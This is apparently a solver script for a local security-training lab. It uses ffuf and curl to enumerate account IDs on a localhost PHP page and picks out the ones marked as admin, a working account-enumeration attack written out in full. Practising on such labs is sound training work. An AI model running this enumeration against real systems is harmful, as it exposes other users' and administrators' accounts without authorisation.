import subprocess
import re

print("Locating Admins at http://localhost/labs/e0x02.php?account=\n Please be patient....\n")
result = subprocess.run(
    ['ffuf', '-u', 'http://localhost/labs/e0x02.php?account=FUZZ', '-w', 'range0_2001.txt', '-fs', '849'],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True
)

ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
clean_output = ansi_escape.sub('', result.stdout)
lines = clean_output.strip().splitlines()
numbers = [int(line.split()[0]) for line in lines if line.strip() and line.split()[0].isdigit()]

print("Running curl to locate admin")

for admin in numbers:
    curl_result = subprocess.run(
        ['curl', f'http://localhost/labs/e0x02.php?account={admin}'],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True
    )
    if "Type: admin" in curl_result.stdout:
    	print(f"[+] Admin found at: http://localhost/labs/e0x02.php?account={admin}")
    	

